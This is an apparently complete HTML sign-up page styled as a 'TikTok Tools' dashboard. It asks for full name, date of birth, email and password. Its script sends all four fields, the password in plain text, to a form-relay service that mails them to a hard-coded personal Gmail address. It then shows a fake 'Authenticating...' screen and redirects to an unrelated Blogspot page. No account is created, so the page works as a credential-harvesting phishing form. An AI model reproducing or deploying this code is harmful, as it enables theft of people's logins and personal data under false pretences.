<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up - TikTok Tools</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body { 
            font-family: 'Poppins', sans-serif;
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            background: linear-gradient(135deg, #0b132b 0%, #1c2541 50%, #0a192f 100%);
            color: #f8fafc; 
            overflow: hidden;
            position: relative;
        }

        /* Animated Background Floating Blobs */
        .bg-circle {
            position: absolute;
            border-radius: 50%;
            filter: blur(80px);
            z-index: 1;
            opacity: 0.6;
            animation: floatShape 12s infinite alternate ease-in-out;
        }

        .blob-1 {
            width: 320px;
            height: 320px;
            background: #2563eb;
            top: -10%;
            left: -5%;
            animation-duration: 9s;
        }

        .blob-2 {
            width: 280px;
            height: 280px;
            background: #00f2fe; /* Cyan TikTok Glow */
            bottom: -5%;
            right: -5%;
            animation-duration: 11s;
        }

        .blob-3 {
            width: 240px;
            height: 240px;
            background: #fe2c55; /* TikTok Red/Pink glow */
            top: 40%;
            right: 25%;
            opacity: 0.25;
            animation-duration: 14s;
        }

        @keyframes floatShape {
            0% { transform: translate(0, 0) scale(1) rotate(0deg); }
            50% { transform: translate(40px, -50px) scale(1.15) rotate(90deg); }
            100% { transform: translate(-30px, 30px) scale(0.95) rotate(180deg); }
        }

        /* Main Squircle Container with Animated Border Glow */
        .glow-pro-box { 
            background: rgba(15, 23, 42, 0.75); 
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            padding: 38px 32px; 
            border-radius: 36px;
            text-align: center; 
            width: 88%;
            max-width: 390px; 
            border: 2px solid rgba(56, 189, 248, 0.35);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 
                        0 0 25px rgba(0, 242, 254, 0.25),
                        inset 0 0 15px rgba(56, 189, 248, 0.15);
            position: relative;
            z-index: 10;
            animation: cardFloat 5s ease-in-out infinite alternate, glowPulse 4s infinite alternate;
        }

        @keyframes cardFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-12px); }
        }

        @keyframes glowPulse {
            0% { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 0 0 20px rgba(0, 242, 254, 0.2); }
            100% { box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 35px rgba(0, 242, 254, 0.45); }
        }

        /* Animated Center Tick Mark Badge */
        .badge-icon {
            width: 65px;
            height: 65px;
            background: linear-gradient(135deg, #00f2fe, #2563eb);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            color: #ffffff;
            font-size: 30px;
            font-weight: bold;
            box-shadow: 0 0 25px rgba(0, 242, 254, 0.6);
            animation: bounceSpin 3s ease-in-out infinite;
        }

        @keyframes bounceSpin {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(6deg); box-shadow: 0 0 35px rgba(0, 242, 254, 0.85); }
        }

        /* Gradient Animated Headline */
        h2 { 
            margin-bottom: 5px;
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(90deg, #00f2fe, #38bdf8, #fe2c55, #00f2fe);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: textGradient 6s ease infinite;
        }

        @keyframes textGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        p {
            font-size: 13px;
            color: #94a3b8;
            margin-bottom: 24px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 16px;
            position: relative;
        }

        label {
            display: block;
            font-size: 12px;
            color: #cbd5e1;
            margin-bottom: 6px;
            font-weight: 500;
            letter-spacing: 0.4px;
        }

        /* Animated Focus Inputs */
        input { 
            width: 100%; 
            padding: 13px 15px; 
            border: 1.5px solid rgba(71, 85, 105, 0.6); 
            background: rgba(15, 23, 42, 0.8); 
            color: #f8fafc; 
            font-size: 14px;
            border-radius: 14px;
            transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
            font-family: 'Poppins', sans-serif;
        }

        input:focus {
            outline: none;
            border-color: #00f2fe;
            background: rgba(15, 23, 42, 0.95);
            box-shadow: 0 0 15px rgba(0, 242, 254, 0.4), inset 0 0 8px rgba(0, 242, 254, 0.2);
            transform: scale(1.02);
        }

        input::placeholder {
            color: #475569;
        }

        /* Button with moving gradient light wave */
        button { 
            position: relative;
            overflow: hidden;
            padding: 14px; 
            background: linear-gradient(135deg, #0284c7 0%, #2563eb 50%, #00f2fe 100%); 
            background-size: 200% 200%;
            color: #ffffff; 
            border: none; 
            border-radius: 14px; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: 600; 
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s ease;
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
            animation: btnShift 4s ease infinite;
        }

        @keyframes btnShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Light Shimmer sweep over button */
        button::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(60deg, transparent, rgba(255,255,255,0.25), transparent);
            transform: rotate(30deg);
            animation: shimmerSweep 3.5s infinite;
        }

        @keyframes shimmerSweep {
            0% { transform: translate(-100%, -100%) rotate(30deg); }
            100% { transform: translate(100%, 100%) rotate(30deg); }
        }

        button:hover {
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.55);
        }

        button:disabled {
            background: #334155;
            box-shadow: none;
            cursor: not-allowed;
            color: #94a3b8;
            animation: none;
        }

        /* Loading Animation */
        #loading-screen { 
            display: none; 
            text-align: center;
            position: relative;
            z-index: 20;
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(15px);
            padding: 40px;
            border-radius: 30px;
            border: 1px solid rgba(56, 189, 248, 0.3);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.3);
        }
        
        .loader {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 4px solid rgba(56, 189, 248, 0.15);
            border-top-color: #00f2fe;
            border-right-color: #fe2c55;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 15px;
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.4);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Background glowing ambient blobs -->
    <div class="bg-circle blob-1"></div>
    <div class="bg-circle blob-2"></div>
    <div class="bg-circle blob-3"></div>

    <div id="loading-screen">
        <div class="loader"></div>
        <p style="color: #f8fafc; font-size: 15px; font-weight: 500;">Authenticating...</p>
    </div>

    <div class="glow-pro-box" id="signup-box">
        <!-- Floating Animated Checkmark -->
        <div class="badge-icon">✓</div>
        
        <h2>Create Account</h2>
        <p>Access your tools dashboard</p>
        
        <div class="input-group">
            <label>Full Name</label>
            <input type="text" id="userFullName" placeholder="e.g. Ali Khan" required />
        </div>

        <div class="input-group">
            <label>Date of Birth</label>
            <input 
                type="text" 
                id="userDOB" 
                placeholder="DD/MM/YYYY" 
                inputmode="numeric"
                maxlength="10" 
                required 
            />
        </div>

        <div class="input-group">
            <label>Email Address</label>
            <input type="email" id="userEmail" placeholder="name@example.com" required />
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" id="userPass" placeholder="••••••••" required />
        </div>
        
        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
    </div>

    <script>
        const adminEmail = "mrpinto1433@gmail.com"; 
        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 

        window.onload = function() {
            if (localStorage.getItem("app_user_verified") === "true") {
                showLoading();
                window.location.href = targetLink;
            }
        };

        // DOB Auto Format
        document.getElementById("userDOB").addEventListener("input", function(e) {
            let val = e.target.value.replace(/\D/g, "");
            let formatted = "";

            if (val.length >= 1) formatted = val.substring(0, 2);
            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
            if (val.length >= 5) formatted += "/" + val.substring(4, 8);

            e.target.value = formatted;
        });

        function showLoading() {
            document.getElementById("signup-box").style.display = "none";
            document.getElementById("loading-screen").style.display = "block";
        }

        function handleSignup() {
            const fullName = document.getElementById("userFullName").value;
            const dob = document.getElementById("userDOB").value;
            const email = document.getElementById("userEmail").value;
            const pass = document.getElementById("userPass").value;
            const btn = document.getElementById("submitBtn");

            if(!fullName || !dob || !email || !pass) {
                alert("Please fill all the details to continue!");
                return;
            }

            btn.innerText = "Processing...";
            btn.disabled = true;

            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
                method: "POST",
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "Full Name": fullName,
                    "Date of Birth": dob,
                    "Email": email,
                    "Password": pass,
                    "_subject": "New App Registration!"
                })
            })
            .then(() => {
                localStorage.setItem("app_user_verified", "true");
                showLoading();
                window.location.href = targetLink;
            })
            .catch(() => {
                alert("Network error! Please check your connection.");
                btn.innerText = "Sign Up";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
